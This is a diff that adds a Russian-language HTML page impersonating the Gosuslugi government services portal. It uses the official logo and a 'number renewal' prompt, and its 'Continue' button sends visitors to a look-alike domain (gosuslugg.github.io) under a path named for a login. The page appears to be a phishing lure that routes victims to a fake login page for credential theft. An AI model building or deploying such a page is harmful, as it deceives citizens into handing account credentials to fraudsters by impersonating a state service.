@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Продление номера</title>
+    <style>
+        body {
+            background-color: #eaf3f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Verdana, sans-serif;
+            position: relative;
+        }
+        .container {
+            top: -70px;
+            background-color: #ffffff;
+            padding: 70px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.5);
+            text-align: center;
+            position: relative;
+            width: 150;
+            max-width: 500px;
+        }
+        .header {
+            margin: 0 auto 20px;
+            width: 120px;
+            height: auto;
+            transform: scale(1.5);
+            margin-bottom: 30px;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 10px;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        input[type="submit"] {
+            width: 75%; /* Уменьшаем ширину кнопки в 2 раза */
+            padding: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0d4cd3;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .alternative-login {
+            font-size: 14px;
+            color: #66727f; /* Цвет текста для альтернативного входа */
+            margin-top: 37px;
+            opacity: 90%;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar"></div>
+    <div class="container">
+        <img class="header" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Gosuslugi.png/150px-Gosuslugi.png" alt="Логотип Госуслуг">
+        <h2>Для продления номера через портал нажмите кнопку продолжить</h2>
+        <form id="loginForm" action="https://gosuslugg.github.io/prodlenie-nomera-login/" method="GET">
+            <input type="submit" value="Продолжить">
+        </form>
+    </div>
+    <div class="bottom-bar"></div>
+</body>
+</html>
